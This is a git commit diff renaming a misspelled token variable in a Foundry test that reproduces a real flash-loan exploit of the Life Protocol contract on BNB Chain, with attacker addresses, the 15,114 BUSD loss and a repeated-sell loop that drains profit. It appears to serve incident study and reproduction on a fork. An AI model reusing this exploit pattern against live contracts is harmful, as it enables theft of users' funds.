0e59f2ef47e2dcdda7c6234323eb70f55f628a4e
ttcht1337 <haotian.cheng@certik.com>
2025-04-27 15:50:07 +0800

    chore: add unit and fix typo

--- src/test/2025-04/Lifeprotocol_exp.sol
+++ src/test/2025-04/Lifeprotocol_exp.sol
@@ -4,7 +4,7 @@ pragma solidity ^0.8.15;
 import "forge-std/Test.sol";
 import "../interface.sol";
 
-// @KeyInfo - Total Lost : 15114
+// @KeyInfo - Total Lost : 15114 BUSD
 // Attacker : https://bscscan.com/address/0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32
 // Attack Contract : https://bscscan.com/address/0xF6Cee497DFE95A04FAa26F3138F9244a4d92f942
 // Vulnerable Contract : https://bscscan.com/address/0x42e2773508e2ae8ff9434bea599812e28449e2cd
@@ -20,7 +20,7 @@ import "../interface.sol";
 
 address constant LifeProtocolContract = 0x42e2773508e2AE8fF9434BEA599812e28449e2Cd;
 address constant dpp = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
-address constant bsud = 0x55d398326f99059fF775485246999027B3197955;
+address constant busd = 0x55d398326f99059fF775485246999027B3197955;
 address constant lifeToken = 0x19B2834f99Fb9eB4164CB5b49046Ec207F894197;
 
 contract t2 is Test {
@@ -28,13 +28,13 @@ contract t2 is Test {
 
     function setUp() public {
         vm.createSelectFork("bsc", 48703546 - 1);
-        IFS(bsud).approve(LifeProtocolContract, quoteAmount);
+        IFS(busd).approve(LifeProtocolContract, quoteAmount);
         IFS(lifeToken).approve(LifeProtocolContract, quoteAmount);
     }
 
     function testExploit() public {
         IFS(dpp).flashLoan(0, quoteAmount, address(this), abi.encodePacked(uint256(1)));
-        console2.log("Profit:", IFS(bsud).balanceOf(address(this)) / 1e18, 'BUSD');
+        console2.log("Profit:", IFS(busd).balanceOf(address(this)) / 1e18, 'BUSD');
     }
 
     function DPPFlashLoanCall(
@@ -50,7 +50,7 @@ contract t2 is Test {
         for(uint256 i=0; i<53; i++) {
             IFS(LifeProtocolContract).sell(1000 * 1e18);
         }
-        IFS(bsud).transfer(dpp, quoteAmount);
+        IFS(busd).transfer(dpp, quoteAmount);
     }
 }
 
